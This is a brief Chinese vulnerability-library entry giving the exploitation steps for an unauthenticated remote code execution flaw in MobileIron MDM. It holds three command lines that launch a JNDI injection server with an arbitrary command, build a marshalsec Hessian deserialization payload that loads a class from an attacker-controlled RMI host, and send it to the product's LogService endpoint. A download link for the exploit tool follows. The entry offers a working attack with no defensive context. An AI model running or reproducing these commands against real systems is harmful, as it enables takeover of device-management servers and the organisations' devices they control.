---
title: 'MobileIron MDM 未授权RCE EXP'
date: Tue, 15 Sep 2020 07:32:20 +0000
draft: false
tags: ['白阁-漏洞库']
---

#### 步骤

```
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -A 0.0.0.0 -C "<Command>"
java -cp ./marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.Hessian SpringAbstractBeanFactoryPointcutAdvisor rmi://<server-ip>:1099/<codebase> > exp
python hessian.py -p exp -u 'https://mobileiron-mdm-instance/mifs/.;/services/LogService' 
```![](https://www.bylibrary.cn/wp-content/uploads/2020/09/poc.png) ![](https://www.bylibrary.cn/wp-content/uploads/2020/09/Screenshot_218.png) EXP 链接：https://pan.baidu.com/s/1jna0ZY-8BqRETUkYiJr5RQ 提取码：nh3f